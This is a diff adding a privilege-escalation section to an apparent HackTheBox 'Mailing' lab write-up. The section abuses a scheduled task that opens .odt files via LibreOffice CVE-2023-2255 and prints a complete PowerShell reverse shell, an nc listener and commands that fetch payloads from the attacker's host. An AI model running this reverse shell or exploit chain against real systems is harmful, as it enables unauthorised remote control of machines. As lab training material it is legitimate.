@@ -1,4 +1,5 @@
 # Mailing-HTB
+First execute a recon with nmap:
 ```bash
 └─$ cat nmap_report.txt
 Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-22 16:25 -0300
@@ -223,10 +224,57 @@ Ok, Important Documents seems, well, pretty important. Let's check it out:
 There is nothing there, let's try it over at evil-winrm, and it works:
 <img width="1912" height="237" alt="image" src="https://github.com/user-attachments/assets/863e20eb-3a3c-465d-8e8c-20479c45aef0" />
 
+PRIVESC
+
+Now for priv esc let's start by checking scheduled tasks
+```bash
+C:\> Get-ScheduledTask | Select-Object TaskName, TaskPath, State
+```
+This'll print out a lista with all scheduled tasks, and here what shines to the eye are the Test and MailPython tasks since they are non default options:
+```bash
+PS C:\> Get-ScheduledTask | Select-Object TaskName, TaskPath, State
+
+TaskName                                                                 TaskPath                                      
+--------                                                                 --------                                      
+MailPython                                                               \                                             
+MicrosoftEdgeUpdateTaskMachineCore{AEA2668C-E9FF-4DBB-87A5-F3D4A44456B6} \                                             
+MicrosoftEdgeUpdateTaskMachineUA{EAB62F67-EF4D-4106-A45A-081B006C98C8}   \                                             
+Test                                                                     \                                             
+.NET Framework NGEN v4.0.30319                                           \Microsoft\Windows\.NET Framework\            
+.NET Framework NGEN v4.0.30319 64                                        \Microsoft\Windows\.NET Framework\            
+.NET Framework NGEN v4.0.30319 64 Critical                               \Microsoft\Windows\.NET Framework\            
+.NET Framework NGEN v4.0.30319 Critical                                  \Microsoft\Windows\.NET Framework\            
+```
+Since 'Test' has the most chance of being something unsafe, henseforth only a 'test' let's explore it first:
+```bash
+Get-ScheduledTask -TaskName "Test" | Select-Object -ExpandProperty Actions
+```
+This commands shows us the properties of that action, meaning that we can see what it does. And this action executes the soffice.ps1 script:
+```bash
+PS C:\> Get-ScheduledTask -TaskName "Test" | Select-Object -ExpandProperty Actions
+
+
+Id               : 
+Arguments        : -ExecutionPolicy Bypass -File C:\Users\localadmin\Documents\scripts\soffice.ps1
+Execute          : C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
+WorkingDirectory : 
+PSComputerName   : 
+```
+Now we'll see who runs this task:
+```bash
+(Get-ScheduledTask -TaskName "Test").Principal | Format-List * 
+```
+It's localadmin:
+<img width="1917" height="280" alt="image" src="https://github.com/user-attachments/assets/a86f7418-3398-49de-9e9c-0c68d58e14b7" />
+
+Let's see what this soffice.ps1 is about:
+<img width="1917" height="428" alt="image" src="https://github.com/user-attachments/assets/7e65cbab-af47-4b2d-bbc4-0602b6021688" />
+
+This is very usefull now. Basically the script checks all .odt files inside \Important Documents and executes them. This could be something.
 We can see that LibreOffice is installed, the .ini file is located inside the programs directory:
 <img width="1917" height="252" alt="image" src="https://github.com/user-attachments/assets/20f55c6a-7dbb-4b36-9dee-32528c73692d" />
 
-Version for LibreOffice is 7.4.0.1 if we look online we'll find the following CVE: CVE-2023-2255. basically this creates a malicious file that when executed with libreoffice'll execute a command of our choosing. First we clone the repository:
+Version for LibreOffice is 7.4.0.1 if we look online we'll find the following CVE: CVE-2023-2255. basically this creates a malicious file that when executed with libreoffice'll execute a command of our choosing. The plan now is to use the PoC to craft a malicious .odt file that forces the machine to execute a reverse shell back to us. First we clone the repository:
 ```bash
 git clone https://github.com/elweth-sec/CVE-2023-2255.git
 ```
@@ -238,4 +286,40 @@ cat cradle | iconv -t utf-16le | base64 -w 0
 This should output a base64 code:
 <img width="1912" height="83" alt="image" src="https://github.com/user-attachments/assets/cf6620ad-98c4-4c3a-9c83-1cba2fe46bb1" />
 
-Next, copy the base64 code and
+Next, copy and execute this command:
+```bash
+python CVE-2023-2255.py --cmd 'cmd /c powershell -enc <your-cradle>' --output exploit.odt
+```
+Practically, what that does is create a malicious .odt file that contains instructions, so that a reverse shell is downloaded unto the target machine and executed.
+Next create a wwww directory and move it into CVE-2023-2255 directory:
+```bash
+mkdir wwww
+cd www
+mv ../CVE-2023-2255/exploit.odt .
+```
+Inside www save this reverse shell to a shell.ps1 file, but take care to substitute the ip to your ip and port to your desired port.
+```bash
+$client = New-Object System.Net.Sockets.TCPClient('<attacker-ip>)',<attacker-port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
+```
+Finally open a server at 'www':
+```
+python -m http.server
+```
+Next open a listener at your desired port:
+```
+nc -lnvp 9001
+```
+Go back to the evil-winrm shell and curl the exploit.odt into Important Documents:
+```bash
+cd \"Important Documents"
+curl http://<tun0-ip>:8000/exploit.odt -o exploit.odt
+```
+If everythin goes well, you should see the exploit.odt being downloaded. Then shortly after shell.ps1:
+<img width="1917" height="90" alt="image" src="https://github.com/user-attachments/assets/b97406b8-5ab6-4cc7-b197-055b9348739e" />
+
+When that happens nc should capture a reverse shell:
+<img width="1917" height="667" alt="image" src="https://github.com/user-attachments/assets/8d57ceb9-68a2-4546-9d9d-2206e8fa213a" />
+
+All of this only worked because there was a sheduled task being executed by localadmin, also there was a version of LibreOffice not patched installed in the system being ran by said scheduled task.
+
+
